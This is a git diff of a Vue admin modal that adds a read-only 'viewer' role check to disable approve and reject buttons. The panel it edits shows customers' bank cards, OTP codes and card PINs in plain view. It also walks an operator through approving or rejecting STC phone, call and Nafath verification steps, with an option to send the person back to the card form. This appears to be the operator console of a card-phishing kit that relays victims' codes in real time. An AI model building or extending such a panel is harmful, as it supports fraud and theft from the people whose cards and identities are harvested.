@@ -52,8 +52,8 @@
             <!-- Card action buttons -->
             <div class="mt-4">
               <div v-if="isPending(currentCard.status)" class="space-y-2">
-                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('card-action', 'card-approve', currentCardIndex)">قبول</AdminButton>
-                <RejectReasonPicker action="card-reject" :disabled="processingAction" @reject="reason => $emit('card-action', 'card-reject', currentCardIndex, reason)" />
+                <AdminButton variant="accept" class="w-full" :disabled="processingAction || isViewer" @click="$emit('card-action', 'card-approve', currentCardIndex)">قبول</AdminButton>
+                <RejectReasonPicker action="card-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('card-action', 'card-reject', currentCardIndex, reason)" />
               </div>
               <div v-else-if="currentCard.status === 'approved' || currentCard.status === 'verified'" class="mt-2 text-center">
                 <StatusPill variant="success" icon-text="✓" label="تمت الموافقة" />
@@ -117,15 +117,15 @@
                 <span class="font-mono text-2xl font-bold tracking-[0.25em] text-amber-400">{{ latestOtp.code || latestOtp.otp_code || '—' }}</span>
               </div>
               <div v-if="isPending(latestOtp.status)" class="mt-auto space-y-2 pt-3">
-                <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'otp-approve')">
+                <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction || isViewer" @click="$emit('payment-action', 'otp-approve')">
                   <i class="fa-solid fa-check ms-1 text-xs" aria-hidden="true"></i>
                   قبول
                 </AdminButton>
-                <RejectReasonPicker action="otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'otp-reject', reason)" />
+                <RejectReasonPicker action="otp-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('payment-action', 'otp-reject', reason)" />
                 <RejectReasonPicker
                   action="otp-reject-redirect"
                   trigger-label="رفض وإعادة لنموذج البطاقة"
-                  :disabled="processingAction"
+                  :disabled="processingAction || isViewer"
                   @reject="reason => $emit('payment-action', 'otp-reject-redirect', reason)"
                 />
               </div>
@@ -155,8 +155,8 @@
                 <span class="font-mono text-2xl font-bold tracking-[0.25em] text-pink-400">{{ latestPin.code || latestPin.pin || '—' }}</span>
               </div>
               <div v-if="isPending(latestPin.status)" class="mt-auto space-y-2 pt-3">
-                <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'pin-approve')">قبول</AdminButton>
-                <RejectReasonPicker action="pin-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'pin-reject', reason)" />
+                <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction || isViewer" @click="$emit('payment-action', 'pin-approve')">قبول</AdminButton>
+                <RejectReasonPicker action="pin-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('payment-action', 'pin-reject', reason)" />
               </div>
               <div v-else-if="latestPin.status === 'approved' || latestPin.status === 'verified'" class="mt-2 text-center">
                 <StatusPill variant="success" icon-text="✓" label="تمت الموافقة" />
@@ -210,8 +210,8 @@
             <div v-if="isStcVerificationFlow(customer) && isStcWaitingForApproval(customer)" class="admin-stage admin-stage--purple">
               <div class="mb-2 text-center text-xs font-semibold text-purple-400">المرحلة 1: موافقة على البيانات المدخلة</div>
               <div class="space-y-2">
-                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
-                <RejectReasonPicker action="stc-waiting-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
+                <AdminButton variant="accept" class="w-full" :disabled="processingAction || isViewer" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
+                <RejectReasonPicker action="stc-waiting-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
               </div>
             </div>
             <div v-else-if="isStcVerificationFlow(customer) && customer?.custom_data?.stc_waiting_approved && !customer?.custom_data?.stc_otp_approved" class="mt-2 text-center">
@@ -220,8 +220,8 @@
             <div v-if="isStcVerificationFlow(customer) && isStcWaitingForOtpApproval(customer)" class="admin-stage admin-stage--yellow">
               <div class="mb-2 text-center text-xs font-semibold text-yellow-400">المرحلة 2: موافقة على رمز التحقق (OTP)</div>
               <div class="space-y-2">
-                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
-                <RejectReasonPicker action="stc-otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
+                <AdminButton variant="accept" class="w-full" :disabled="processingAction || isViewer" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
+                <RejectReasonPicker action="stc-otp-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
               </div>
             </div>
             <div v-else-if="isStcVerificationFlow(customer) && customer?.custom_data?.stc_otp_approved && !customer?.custom_data?.stc_call_approved" class="mt-2 text-center">
@@ -230,8 +230,8 @@
             <div v-if="isStcVerificationFlow(customer) && isStcWaitingForCallApproval(customer)" class="admin-stage admin-stage--cyan">
               <div class="mb-2 text-center text-xs font-semibold text-cyan-400">المرحلة 3: موافقة على المكالمة</div>
               <div class="space-y-2">
-                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
-                <RejectReasonPicker action="stc-call-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
+                <AdminButton variant="accept" class="w-full" :disabled="processingAction || isViewer" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
+                <RejectReasonPicker action="stc-call-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
               </div>
             </div>
             <div v-else-if="isStcVerificationFlow(customer) && customer?.custom_data?.stc_call_approved" class="mt-2 text-center">
@@ -248,8 +248,8 @@
             <div v-if="!isStcVerificationFlow(customer) && isPhoneDataWaitingForApproval(customer)" class="admin-stage admin-stage--purple">
               <div class="mb-2 text-center text-xs font-semibold text-purple-400">المرحلة 1: موافقة على بيانات الهاتف</div>
               <div class="space-y-2">
-                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-data-approve')">قبول</AdminButton>
-                <RejectReasonPicker action="phone-data-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-data-reject', reason)" />
+                <AdminButton variant="accept" class="w-full" :disabled="processingAction || isViewer" @click="$emit('payment-action', 'phone-data-approve')">قبول</AdminButton>
+                <RejectReasonPicker action="phone-data-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('payment-action', 'phone-data-reject', reason)" />
               </div>
             </div>
             <div v-else-if="!isStcVerificationFlow(customer) && customer?.custom_data?.phone_data_status === 'approved' && customer?.custom_data?.phone_otp_status !== 'approved'" class="mt-2 text-center">
@@ -258,8 +258,8 @@
             <div v-if="!isStcVerificationFlow(customer) && isPhoneOtpWaitingForApproval(customer)" class="admin-stage admin-stage--yellow">
               <div class="mb-2 text-center text-xs font-semibold text-yellow-400">المرحلة 2: موافقة على رمز التحقق (OTP)</div>
               <div class="space-y-2">
-                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-otp-approve')">قبول</AdminButton>
-                <RejectReasonPicker action="phone-otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-otp-reject', reason)" />
+                <AdminButton variant="accept" class="w-full" :disabled="processingAction || isViewer" @click="$emit('payment-action', 'phone-otp-approve')">قبول</AdminButton>
+                <RejectReasonPicker action="phone-otp-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('payment-action', 'phone-otp-reject', reason)" />
               </div>
             </div>
             <div v-else-if="!isStcVerificationFlow(customer) && customer?.custom_data?.phone_otp_status === 'approved'" class="mt-2 text-center">
@@ -316,7 +316,7 @@
                   :disabled="processingAction || (!nafathDisplayNumber && !latestNafath.verification_code)"
                   @click="$emit('payment-action', 'nafath-approve')"
                 >قبول</AdminButton>
-                <RejectReasonPicker action="nafath-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'nafath-reject', reason)" />
+                <RejectReasonPicker action="nafath-reject" :disabled="processingAction || isViewer" @reject="reason => $emit('payment-action', 'nafath-reject', reason)" />
               </div>
               <div v-else-if="latestNafath.status === 'approved' || latestNafath.status === 'verified'" class="mt-2 text-center">
                 <StatusPill variant="success" icon-text="✓" label="تمت الموافقة" />
@@ -343,16 +343,19 @@
 </template>
 
 <script setup>
-import { onMounted, onUnmounted } from 'vue';
+import { computed, onMounted, onUnmounted } from 'vue';
 import { useI18n } from 'vue-i18n';
 import { ModalShell, StatusPill, AdminButton, DataField } from '../ui';
 import BankCard3D from '../BankCard3D.vue';
 import RejectReasonPicker from '../RejectReasonPicker.vue';
 import { useCustomerFormatters } from '../../utils/customerFormatters';
 import { getReasonLabel } from '@/constants/rejectionReasons';
+import { useUserStore } from '@/store/modules/user';
 
 const { t } = useI18n();
 const { isPending, formatDateTimeEN } = useCustomerFormatters();
+const userStore = useUserStore();
+const isViewer = computed( () => userStore.role === 'viewer' );
 
 const props = defineProps({
   open: { type: Boolean, default: false },
